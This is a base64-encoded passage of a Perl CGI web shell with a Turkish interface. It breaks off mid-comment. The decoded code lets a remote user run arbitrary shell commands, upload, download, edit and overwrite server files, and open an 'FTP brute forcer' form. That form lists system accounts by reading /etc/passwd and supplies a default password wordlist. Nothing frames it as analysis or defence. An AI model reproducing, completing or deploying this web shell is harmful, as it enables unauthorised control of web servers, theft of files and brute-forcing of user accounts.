DQpzdWIgUHJpbnREb3dubG9hZExpbmtQYWdlDQp7DQoJbG9jYWwoJEZpbGVVcmwpID0gQF87DQoJbXkgJHJlc3VsdD0iIjsNCglpZigtZSAkRmlsZVVybCkgIyBpZiB0aGUgZmlsZSBleGlzdHMNCgl7DQoJCSMgZW5jb2RlIHRoZSBmaWxlIGxpbmsgc28gd2UgY2FuIHNlbmQgaXQgdG8gdGhlIGJyb3dzZXINCgkJJEZpbGVVcmwgPX4gcy8oW15hLXpBLVowLTldKS8nJScudW5wYWNrKCJIKiIsJDEpL2VnOw0KCQkkRG93bmxvYWRMaW5rID0gIiRTY3JpcHRMb2NhdGlvbj9hPWRvd25sb2FkJmY9JEZpbGVVcmwmbz1nbyI7DQoJCSRIdG1sTWV0YUhlYWRlciA9ICI8bWV0YSBIVFRQLUVRVUlWPVwiUmVmcmVzaFwiIENPTlRFTlQ9XCIxOyBVUkw9JERvd25sb2FkTGlua1wiPiI7DQoJCSZQcmludFBhZ2VIZWFkZXIoImMiKTsNCgkJJHJlc3VsdCAuPSA8PEVORDsNCkRvc3lhIEfDtm5kZXJpbGl5b3IgJFRyYW5zZmVyRmlsZS4uLjxicj4NCg0KSW5kaXJtZSBPdG9tYXRpayBCYXNsYW1hZGl5c2EsDQo8YSBocmVmPSIkRG93bmxvYWRMaW5rIj5CdXJheWEgVGlrbGEgUGFucGE8L2E+DQpFTkQNCgkJJHJlc3VsdCAuPSAmUHJpbnRDb21tYW5kTGluZUlucHV0Rm9ybTsNCgl9DQoJZWxzZSAjIGZpbGUgZG9lc24ndCBleGlzdA0KCXsNCgkJJHJlc3VsdCAuPSAiSW5kaXJpbGlya2VuIEhhdGEgJEZpbGVVcmw6ICQhIjsNCgkJJHJlc3VsdCAuPSAmUHJpbnRGaWxlRG93bmxvYWRGb3JtOw0KCX0NCglyZXR1cm4gJHJlc3VsdDsNCn0NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgVGhpcyBmdW5jdGlvbiByZWFkcyB0aGUgc3BlY2lmaWVkIGZpbGUgZnJvbSB0aGUgZGlzayBhbmQgc2VuZHMgaXQgdG8gdGhlDQojIGJyb3dzZXIsIHNvIHRoYXQgaXQgY2FuIGJlIGRvd25sb2FkZWQgYnkgdGhlIHVzZXIuDQojIEFyZ3VtZW50IDE6IEZ1bGx5IHF1YWxpZmllZCBwYXRobmFtZSBvZiB0aGUgZmlsZSB0byBiZSBzZW50Lg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFNlbmRGaWxlVG9Ccm93c2VyDQp7DQoJbXkgJHJlc3VsdCA9ICIiOw0KCWxvY2FsKCRTZW5kRmlsZSkgPSBAXzsNCglpZihvcGVuKFNFTkRGSUxFLCAkU2VuZEZpbGUpKSAjIGZpbGUgb3BlbmVkIGZvciByZWFkaW5nDQoJew0KCQlpZigkV2luTlQpDQoJCXsNCgkJCWJpbm1vZGUoU0VOREZJTEUpOw0KCQkJYmlubW9kZShTVERPVVQpOw0KCQl9DQoJCSRGaWxlU2l6ZSA9IChzdGF0KCRTZW5kRmlsZSkpWzddOw0KCQkoJEZpbGVuYW1lID0gJFNlbmRGaWxlKSA9fiAgbSEoW14vXlxcXSopJCE7DQoJCXByaW50ICJDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtdW5rbm93blxuIjsNCgkJcHJpbnQgIkNvbnRlbnQtTGVuZ3RoOiAkRmlsZVNpemVcbiI7DQoJCXByaW50ICJDb250ZW50LURpc3Bvc2l0aW9uOiBhdHRhY2htZW50OyBmaWxlbmFtZT0kMVxuXG4iOw0KCQlwcmludCB3aGlsZSg8U0VOREZJTEU+KTsNCgkJY2xvc2UoU0VOREZJTEUpOw0KCQlleGl0KDEpOw0KCX0NCgllbHNlICMgZmFpbGVkIHRvIG9wZW4gZmlsZQ0KCXsNCgkJJHJlc3VsdCAuPSAiSW5kaXJpbGlya2VuIEhhdGEgJFNlbmRGaWxlOiAkISI7DQoJCSRyZXN1bHQgLj0mUHJpbnRGaWxlRG93bmxvYWRGb3JtOw0KCX0NCglyZXR1cm4gJHJlc3VsdDsNCn0NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgd2hlbiB0aGUgdXNlciBkb3dubG9hZHMgYSBmaWxlLiBJdCBkaXNwbGF5cyBhIG1lc3NhZ2UNCiMgdG8gdGhlIHVzZXIgYW5kIHByb3ZpZGVzIGEgbGluayB0aHJvdWdoIHdoaWNoIHRoZSBmaWxlIGNhbiBiZSBkb3dubG9hZGVkLg0KIyBUaGlzIGZ1bmN0aW9uIGlzIGFsc28gY2FsbGVkIHdoZW4gdGhlIHVzZXIgY2xpY2tzIG9uIHRoYXQgbGluay4gSW4gdGhpcyBjYXNlLA0KIyB0aGUgZmlsZSBpcyByZWFkIGFuZCBzZW50IHRvIHRoZSBicm93c2VyLg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIEJlZ2luRG93bmxvYWQNCnsNCgkkRW5jb2RlQ3VycmVudERpciA9IEVuY29kZURpcigkQ3VycmVudERpcik7DQoJIyBnZXQgZnVsbHkgcXVhbGlmaWVkIHBhdGggb2YgdGhlIGZpbGUgdG8gYmUgZG93bmxvYWRlZA0KCWlmKCgkV2luTlQgJiAoJFRyYW5zZmVyRmlsZSA9fiBtL15cXHxeLjovKSkgfA0KCQkoISRXaW5OVCAmICgkVHJhbnNmZXJGaWxlID1+IG0vXlwvLykpKSAjIHBhdGggaXMgYWJzb2x1dGUNCgl7DQoJCSRUYXJnZXRGaWxlID0gJFRyYW5zZmVyRmlsZTsNCgl9DQoJZWxzZSAjIHBhdGggaXMgcmVsYXRpdmUNCgl7DQoJCWNob3AoJFRhcmdldEZpbGUpIGlmKCRUYXJnZXRGaWxlID0gJEN1cnJlbnREaXIpID1+IG0vW1xcXC9dJC87DQoJCSRUYXJnZXRGaWxlIC49ICRQYXRoU2VwLiRUcmFuc2ZlckZpbGU7DQoJfQ0KDQoJaWYoJE9wdGlvbnMgZXEgImdvIikgIyB3ZSBoYXZlIHRvIHNlbmQgdGhlIGZpbGUNCgl7DQoJCSZTZW5kRmlsZVRvQnJvd3NlcigkVGFyZ2V0RmlsZSk7DQoJfQ0KCWVsc2UgIyB3ZSBoYXZlIHRvIHNlbmQgb25seSB0aGUgbGluayBwYWdlDQoJew0KCQkmUHJpbnREb3dubG9hZExpbmtQYWdlKCRUYXJnZXRGaWxlKTsNCgl9DQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgd2hlbiB0aGUgdXNlciB3YW50cyB0byB1cGxvYWQgYSBmaWxlLiBJZiB0aGUNCiMgZmlsZSBpcyBub3Qgc3BlY2lmaWVkLCBpdCBkaXNwbGF5cyBhIGZvcm0gYWxsb3dpbmcgdGhlIHVzZXIgdG8gc3BlY2lmeSBhDQojIGZpbGUsIG90aGVyd2lzZSBpdCBzdGFydHMgdGhlIHVwbG9hZCBwcm9jZXNzLg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFVwbG9hZEZpbGUNCnsNCgkjIGlmIG5vIGZpbGUgaXMgc3BlY2lmaWVkLCBwcmludCB0aGUgdXBsb2FkIGZvcm0gYWdhaW4NCglpZigkVHJhbnNmZXJGaWxlIGVxICIiKQ0KCXsNCgkJcmV0dXJuICZQcmludEZpbGVVcGxvYWRGb3JtOw0KDQoJfQ0KCW15ICRyZXN1bHQ9IiI7DQoJIyBzdGFydCB0aGUgdXBsb2FkaW5nIHByb2Nlc3MNCgkkcmVzdWx0IC49ICJCdSBEb3N5YSAkVHJhbnNmZXJGaWxlIEJ1IERpemluZSAkQ3VycmVudERpciBZw7xrbGVuaXlvci4uPGJyPiI7DQoNCgkjIGdldCB0aGUgZnVsbGx5IHF1YWxpZmllZCBwYXRobmFtZSBvZiB0aGUgZmlsZSB0byBiZSBjcmVhdGVkDQoJY2hvcCgkVGFyZ2V0TmFtZSkgaWYgKCRUYXJnZXROYW1lID0gJEN1cnJlbnREaXIpID1+IG0vW1xcXC9dJC87DQoJJFRyYW5zZmVyRmlsZSA9fiBtIShbXi9eXFxdKikkITsNCgkkVGFyZ2V0TmFtZSAuPSAkUGF0aFNlcC4kMTsNCg0KCSRUYXJnZXRGaWxlU2l6ZSA9IGxlbmd0aCgkaW57J2ZpbGVkYXRhJ30pOw0KCSMgaWYgdGhlIGZpbGUgZXhpc3RzIGFuZCB3ZSBhcmUgbm90IHN1cHBvc2VkIHRvIG92ZXJ3cml0ZSBpdA0KCWlmKC1lICRUYXJnZXROYW1lICYmICRPcHRpb25zIG5lICJvdmVyd3JpdGUiKQ0KCXsNCgkJJHJlc3VsdCAuPSAiQmFzYXJpc2l6OiBIZWRlZiBEb3N5YSBaYXRlbiBWYXIuPGJyPiI7DQoJfQ0KCWVsc2UgIyBmaWxlIGlzIG5vdCBwcmVzZW50DQoJew0KCQlpZihvcGVuKFVQTE9BREZJTEUsICI+JFRhcmdldE5hbWUiKSkNCgkJew0KCQkJYmlubW9kZShVUExPQURGSUxFKSBpZiAkV2luTlQ7DQoJCQlwcmludCBVUExPQURGSUxFICRpbnsnZmlsZWRhdGEnfTsNCgkJCWNsb3NlKFVQTE9BREZJTEUpOw0KCQkJJHJlc3VsdCAuPSAiVHJhbnNmZXIgRWRpbGRpOiAkVGFyZ2V0RmlsZVNpemUgQnl0ZXMuPGJyPiI7DQoJCQkkcmVzdWx0IC49ICJEb3N5YSBZb2x1OiAkVGFyZ2V0TmFtZTxicj4iOw0KCQl9DQoJCWVsc2UNCgkJew0KCQkJJHJlc3VsdCAuPSAiQmFzYXJpc2l6OiAkITxicj4iOw0KCQl9DQoJfQ0KCSRyZXN1bHQgLj0gJlByaW50Q29tbWFuZExpbmVJbnB1dEZvcm07DQoJcmV0dXJuICRyZXN1bHQ7DQp9DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFRoaXMgZnVuY3Rpb24gaXMgY2FsbGVkIHdoZW4gdGhlIHVzZXIgd2FudHMgdG8gZG93bmxvYWQgYSBmaWxlLiBJZiB0aGUNCiMgZmlsZW5hbWUgaXMgbm90IHNwZWNpZmllZCwgaXQgZGlzcGxheXMgYSBmb3JtIGFsbG93aW5nIHRoZSB1c2VyIHRvIHNwZWNpZnkgYQ0KIyBmaWxlLCBvdGhlcndpc2UgaXQgZGlzcGxheXMgYSBtZXNzYWdlIHRvIHRoZSB1c2VyIGFuZCBwcm92aWRlcyBhIGxpbmsNCiMgdGhyb3VnaCAgd2hpY2ggdGhlIGZpbGUgY2FuIGJlIGRvd25sb2FkZWQuDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgRG93bmxvYWRGaWxlDQp7DQoJIyBpZiBubyBmaWxlIGlzIHNwZWNpZmllZCwgcHJpbnQgdGhlIGRvd25sb2FkIGZvcm0gYWdhaW4NCglpZigkVHJhbnNmZXJGaWxlIGVxICIiKQ0KCXsNCgkJJlByaW50UGFnZUhlYWRlcigiZiIpOw0KCQlyZXR1cm4gJlByaW50RmlsZURvd25sb2FkRm9ybTsNCgl9DQoNCgkjIGdldCBmdWxseSBxdWFsaWZpZWQgcGF0aCBvZiB0aGUgZmlsZSB0byBiZSBkb3dubG9hZGVkDQoJaWYoKCRXaW5OVCAmICgkVHJhbnNmZXJGaWxlID1+IG0vXlxcfF4uOi8pKSB8ICghJFdpbk5UICYgKCRUcmFuc2ZlckZpbGUgPX4gbS9eXC8vKSkpICMgcGF0aCBpcyBhYnNvbHV0ZQ0KCXsNCgkJJFRhcmdldEZpbGUgPSAkVHJhbnNmZXJGaWxlOw0KCX0NCgllbHNlICMgcGF0aCBpcyByZWxhdGl2ZQ0KCXsNCgkJY2hvcCgkVGFyZ2V0RmlsZSkgaWYoJFRhcmdldEZpbGUgPSAkQ3VycmVudERpcikgPX4gbS9bXFxcL10kLzsNCgkJJFRhcmdldEZpbGUgLj0gJFBhdGhTZXAuJFRyYW5zZmVyRmlsZTsNCgl9DQoNCglpZigkT3B0aW9ucyBlcSAiZ28iKSAjIHdlIGhhdmUgdG8gc2VuZCB0aGUgZmlsZQ0KCXsNCgkJcmV0dXJuICZTZW5kRmlsZVRvQnJvd3NlcigkVGFyZ2V0RmlsZSk7DQoJfQ0KCWVsc2UgIyB3ZSBoYXZlIHRvIHNlbmQgb25seSB0aGUgbGluayBwYWdlDQoJew0KCQlyZXR1cm4gJlByaW50RG93bmxvYWRMaW5rUGFnZSgkVGFyZ2V0RmlsZSk7DQoJfQ0KfQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBUaGlzIGZ1bmN0aW9uIGlzIGNhbGxlZCB0byBleGVjdXRlIGNvbW1hbmRzLiBJdCBkaXNwbGF5cyB0aGUgb3V0cHV0IG9mIHRoZQ0KIyBjb21tYW5kIGFuZCBhbGxvd3MgdGhlIHVzZXIgdG8gZW50ZXIgYW5vdGhlciBjb21tYW5kLiBUaGUgY2hhbmdlIGRpcmVjdG9yeQ0KIyBjb21tYW5kIGlzIGhhbmRsZWQgZGlmZmVyZW50bHkuIEluIHRoaXMgY2FzZSwgdGhlIG5ldyBkaXJlY3RvcnkgaXMgc3RvcmVkIGluDQojIGFuIGludGVybmFsIHZhcmlhYmxlIGFuZCBpcyB1c2VkIGVhY2ggdGltZSBhIGNvbW1hbmQgaGFzIHRvIGJlIGV4ZWN1dGVkLiBUaGUNCiMgb3V0cHV0IG9mIHRoZSBjaGFuZ2UgZGlyZWN0b3J5IGNvbW1hbmQgaXMgbm90IGRpc3BsYXllZCB0byB0aGUgdXNlcnMNCiMgdGhlcmVmb3JlIGVycm9yIG1lc3NhZ2VzIGNhbm5vdCBiZSBkaXNwbGF5ZWQuDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgRXhlY3V0ZUNvbW1hbmQNCnsNCgkkQ3VycmVudERpciA9ICZUcmltU2xhc2hlcygkQ3VycmVudERpcik7DQoJbXkgJHJlc3VsdD0iIjsNCglpZigkUnVuQ29tbWFuZCA9fiBtL15ccypjZFxzKyguKykvKSAjIGl0IGlzIGEgY2hhbmdlIGRpciBjb21tYW5kDQoJew0KCQkjIHdlIGNoYW5nZSB0aGUgZGlyZWN0b3J5IGludGVybmFsbHkuIFRoZSBvdXRwdXQgb2YgdGhlDQoJCSMgY29tbWFuZCBpcyBub3QgZGlzcGxheWVkLg0KCQkkQ29tbWFuZCA9ICJjZCBcIiRDdXJyZW50RGlyXCIiLiRDbWRTZXAuImNkICQxIi4kQ21kU2VwLiRDbWRQd2Q7DQoJCWNob21wKCRDdXJyZW50RGlyID0gYCRDb21tYW5kYCk7DQoJCSRyZXN1bHQgLj0gJlByaW50Q29tbWFuZExpbmVJbnB1dEZvcm07DQoNCgkJJHJlc3VsdCAuPSAiS29tdXI6IDxydW4+JFJ1bkNvbW1hbmQgPC9ydW4+PGJyPjx0ZXh0YXJlYSBjb2xzPSckY29scycgcm93cz0nJHJvd3MnIHNwZWxsY2hlY2s9J2ZhbHNlJz4iOw0KCQkjIHh1YXQgdGhvbmcgdGluIGtoaSBjaHV5ZW4gZGVuIDEgdGh1IG11YyBuYW8gZG8hDQoJCSRSdW5Db21tYW5kPSAkV2luTlQ/ImRpciI6ImRpciAtbGlhIjsNCgkJJHJlc3VsdCAuPSAmUnVuQ21kOw0KCX1lbHNpZigkUnVuQ29tbWFuZCA9fiBtL15ccyplZGl0XHMrKC4rKS8pDQoJew0KCQkkcmVzdWx0IC49ICAmU2F2ZUZpbGVGb3JtOw0KCX1lbHNlDQoJew0KCQkkcmVzdWx0IC49ICZQcmludENvbW1hbmRMaW5lSW5wdXRGb3JtOw0KCQkkcmVzdWx0IC49ICJLb211dDogPHJ1bj4kUnVuQ29tbWFuZDwvcnVuPjxicj48dGV4dGFyZWEgaWQ9J2RhdGEnIGNvbHM9JyRjb2xzJyByb3dzPSckcm93cycgc3BlbGxjaGVjaz0nZmFsc2UnPiI7DQoJCSRyZXN1bHQgLj0mUnVuQ21kOw0KCX0NCgkkcmVzdWx0IC49ICAiPC90ZXh0YXJlYT4iOw0KCXJldHVybiAkcmVzdWx0Ow0KfQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBydW4gY29tbWFuZA0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFJ1bkNtZA0Kew0KCW15ICRyZXN1bHQ9IiI7DQoJJENvbW1hbmQgPSAiY2QgXCIkQ3VycmVudERpclwiIi4kQ21kU2VwLiRSdW5Db21tYW5kLiRSZWRpcmVjdG9yOw0KCWlmKCEkV2luTlQpDQoJew0KCQkkU0lHeydBTFJNJ30gPSBcJkNvbW1hbmRUaW1lb3V0Ow0KCQlhbGFybSgkQ29tbWFuZFRpbWVvdXREdXJhdGlvbik7DQoJfQ0KCWlmKCRTaG93RHluYW1pY091dHB1dCkgIyBzaG93IG91dHB1dCBhcyBpdCBpcyBnZW5lcmF0ZWQNCgl7DQoJCSR8PTE7DQoJCSRDb21tYW5kIC49ICIgfCI7DQoJCW9wZW4oQ29tbWFuZE91dHB1dCwgJENvbW1hbmQpOw0KCQl3aGlsZSg8Q29tbWFuZE91dHB1dD4pDQoJCXsNCgkJCSRfID1+IHMvKFxufFxyXG4pJC8vOw0KCQkJJHJlc3VsdCAuPSAmSHRtbFNwZWNpYWxDaGFycygiJF9cbiIpOw0KCQl9DQoJCSR8PTA7DQoJfQ0KCWVsc2UgIyBzaG93IG91dHB1dCBhZnRlciBjb21tYW5kIGNvbXBsZXRlcw0KCXsNCgkJJHJlc3VsdCAuPSAmSHRtbFNwZWNpYWxDaGFycygkQ29tbWFuZCk7DQoJfQ0KCWlmKCEkV2luTlQpDQoJew0KCQlhbGFybSgwKTsNCgl9DQoJcmV0dXJuICRyZXN1bHQ7DQp9DQojPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09DQojIEZvcm0gU2F2ZSBGaWxlIA0KIz09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQ0Kc3ViIFNhdmVGaWxlRm9ybQ0Kew0KCW15ICRyZXN1bHQgPSIiOw0KCSRFbmNvZGVDdXJyZW50RGlyID0gRW5jb2RlRGlyKCRDdXJyZW50RGlyKTsNCglzdWJzdHIoJFJ1bkNvbW1hbmQsMCw1KT0iIjsNCglteSAkZmlsZT0mdHJpbSgkUnVuQ29tbWFuZCk7DQoJJHNhdmU9Jzxicj48aW5wdXQgbmFtZT0iYSIgdHlwZT0ic3VibWl0IiB2YWx1ZT0iS2F5ZGV0IiA+JzsNCgkkRmlsZT0kQ3VycmVudERpci4kUGF0aFNlcC4kUnVuQ29tbWFuZDsNCglteSAkZGlyPSI8c3BhbiBzdHlsZT0nZm9udDogMTFwdCBWZXJkYW5hOyBmb250LXdlaWdodDogYm9sZDsnPiIuJkFkZExpbmtEaXIoImd1aSIpLiI8L3NwYW4+IjsNCglpZigtdyAkRmlsZSkNCgl7DQoJCSRyb3dzPSIyMyINCgl9ZWxzZQ0KCXsNCgkJJG1zZz0iPGJyPjxmb250IHN0eWxlPSdjb2xvcjogeWVsbG93OycgPkJ1IERvc3lheWEgWWF6aWxhbWF6ITxmb250Pjxicj4iOw0KCQkkcm93cz0iMjAiDQoJfQ0KCSRQcm9tcHQgPSAkV2luTlQgPyAiJGRpciA+ICIgOiAiPGZvbnQgY29sb3I9JyNGRkZGRkYnPlthZG1pblxAJFNlcnZlck5hbWUgJGRpcl1cJDwvZm9udD4gIjsNCgkkUnVuQ29tbWFuZCA9ICJlZGl0ICRSdW5Db21tYW5kIjsNCgkkcmVzdWx0IC49ICA8PEVORDsNCgk8Zm9ybSBuYW1lPSJmIiBtZXRob2Q9IlBPU1QiIGFjdGlvbj0iJFNjcmlwdExvY2F0aW9uIj4NCg0KCTxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImQiIHZhbHVlPSIkRW5jb2RlQ3VycmVudERpciI+DQoJJFByb21wdA0KCTxpbnB1dCB0eXBlPSJ0ZXh0IiBzaXplPSI0MCIgbmFtZT0iYyI+DQoJPGlucHV0IG5hbWU9InMiIHR5cGU9InN1Ym1pdCIgdmFsdWU9IkVudGVyIj4NCgk8YnI+Q29tbWFuZDogPHJ1bj4gJFJ1bkNvbW1hbmQgPC9ydW4+DQoJPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iZmlsZSIgdmFsdWU9IiRmaWxlIiA+ICRzYXZlIDxicj4gJG1zZw0KCTxicj48dGV4dGFyZWEgaWQ9ImRhdGEiIG5hbWU9ImRhdGEiIGNvbHM9IiRjb2xzIiByb3dzPSIkcm93cyIgc3BlbGxjaGVjaz0iZmFsc2UiPg0KRU5EDQoNCgkkcmVzdWx0IC49ICZIdG1sU3BlY2lhbENoYXJzKCZGaWxlT3BlbigkRmlsZSwwKSk7DQoJJHJlc3VsdCAuPSAiPC90ZXh0YXJlYT4iOw0KCSRyZXN1bHQgLj0gIjwvZm9ybT4iOw0KCXJldHVybiAkcmVzdWx0Ow0KfQ0KIz09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQ0KIyBGaWxlIE9wZW4NCiM9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0NCnN1YiBGaWxlT3BlbigkKXsNCglteSAkZmlsZSA9IHNoaWZ0Ow0KCW15ICRiaW5hcnkgPSBzaGlmdDsNCglteSAkcmVzdWx0ID0gIiI7DQoJbXkgJG4gPSAiIjsNCglpZigtZiAkZmlsZSl7DQoJCWlmKG9wZW4oRklMRSwkZmlsZSkpew0KCQkJaWYoJGJpbmFyeSl7DQoJCQkJYmlubW9kZSBGSUxFOw0KCQkJfQ0KCQkJd2hpbGUgKCgkbiA9IHJlYWQgRklMRSwgJGRhdGEsIDEwMjQpICE9IDApIHsNCgkJCQkkcmVzdWx0IC49ICRkYXRhOw0KCQkJfQ0KCQkJY2xvc2UoRklMRSk7DQoJCX0NCgl9ZWxzZQ0KCXsNCgkJcmV0dXJuICJCdSBiaXIgZG9zeWEgZGVnaWwhIjsNCgl9DQoJcmV0dXJuICRyZXN1bHQ7DQp9DQojPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09DQojIFNhdmUgRmlsZQ0KIz09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQ0Kc3ViIFNhdmVGaWxlKCQpDQp7DQoJbXkgJERhdGE9IHNoaWZ0IDsNCglteSAkRmlsZT0gc2hpZnQ7DQoJJEZpbGU9JEN1cnJlbnREaXIuJFBhdGhTZXAuJEZpbGU7DQoJaWYob3BlbihGSUxFLCAiPiRGaWxlIikpDQoJew0KCQliaW5tb2RlIEZJTEU7DQoJCXByaW50IEZJTEUgJERhdGE7DQoJCWNsb3NlIEZJTEU7DQoJCXJldHVybiAxOw0KCX1lbHNlDQoJew0KCQlyZXR1cm4gMDsNCgl9DQp9DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIEJydXRlIEZvcmNlciBGb3JtDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgQnJ1dGVGb3JjZXJGb3JtDQp7DQoJbXkgJHJlc3VsdD0iIjsNCgkkcmVzdWx0IC49IDw8RU5EOw0KDQo8dGFibGU+DQoNCjx0cj4NCjx0ZCBjb2xzcGFuPSIyIiBhbGlnbj0iY2VudGVyIj4NCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIzxicj4NCkZUUCBicnV0ZSBmb3JjZXI8YnI+DQpTYWRlY2UgMWRlbiAzZSBrYWRhciBrdWxsYW5pY2kgdGFyaXlvciA6Uzxicj4NCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIw0KPGZvcm0gbmFtZT0iZiIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2NhdGlvbiI+DQoNCjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJicnV0ZWZvcmNlciIvPg0KPC90ZD4NCjwvdHI+DQo8dHI+DQo8dGQ+S3VsbGFuaWNpOjxicj48dGV4dGFyZWEgcm93cz0iMTgiIGNvbHM9IjMwIiBuYW1lPSJ1c2VyIj4NCkVORA0KY2hvcCgkcmVzdWx0IC49IGBsZXNzIC9ldGMvcGFzc3dkIHwgY3V0IC1kOiAtZjFgKTsNCiRyZXN1bHQgLj0gPDwnRU5EJzsNCjwvdGV4dGFyZWE+PC90ZD4NCjx0ZD4NCg0KU2lmcmU6PGJyPg0KPHRleHRhcmVhIHJvd3M9IjE4IiBjb2xzPSIzMCIgbmFtZT0icGFzcyI+MTIzcGFzcw0KMTIzIUAjDQoxMjNhZG1pbg0KMTIzYWJjDQoxMjM0NTZhZG1pbg0KMTIzNDU1NDMyMQ0KMTIzNDQzMjENCnBhc3MxMjMNCmFkbWluDQphZG1pbmNwDQphZG1pbmlzdHJhdG9yDQptYXRraGF1DQpwYXNzYWRtaW4NCnBAc3N3b3JkDQpwQHNzdzByZA0KcGFzc3dvcmQNCjEyMzQ1Ng0KMTIzNDU2Nw0KMTIzNDU2NzgNCjEyMzQ1Njc4OQ0KMTIzNDU2Nzg5MA0KMTExMTExDQowMDAwMDANCjIyMjIyMg0KMzMzMzMzDQo0NDQ0NDQNCjU1NTU1NQ0KNjY2NjY2DQo3Nzc3NzcNCjg4ODg4OA0KOTk5OTk5DQoxMjMxMjMNCjIzNDIzNA0KMzQ1MzQ1DQo0NTY0NTYNCjU2NzU2Nw0KNjc4Njc4DQo3ODk3ODkNCjEyMzMyMQ0KNDU2NjU0DQo2NTQzMjENCjc2NTQzMjENCjg3NjU0MzIxDQo5ODc2NTQzMjENCjA5ODc2NTQzMjENCmFkbWluMTIzDQphZG1pbjEyMzQ1Ng0KYWJjZGVmDQphYmNhYmMNCiFAIyFAIw0KIUAjJCVeDQohQCMkJV4mKigNCiFAIyQkI0AhDQphYmMxMjMNCmFuaHlldWVtDQppbG92ZXlvdTwvdGV4dGFyZWE+DQo8L3RkPg0KPC90cj4NCjx0cj4NCjx0ZCBjb2xzcGFuPSIyIiBhbGlnbj0iY2VudGVyIj4NClV5a3U6PHNlbGVjdCBuYW1lPSJzbGVlcCI+DQoNCjxvcHRpb24+MDwvb3B0aW9uPg0KPG9wdGlvbj4xPC9vcHRpb24+DQo8b3B0aW9uPjI8L29wdGlvbj4NCg0KPG9wdGlvbj4zPC9vcHRpb24+DQo8L3NlbGVjdD4gDQo8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iQmFzbGEgUGFucGEiLz48L3RkPjwvdHI+DQo8L2Zvcm0+DQo8L3RhYmxlPg0KRU5EDQpyZXR1cm4gJHJlc3VsdDsNCn0NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgQnJ1dGUgRm9yY2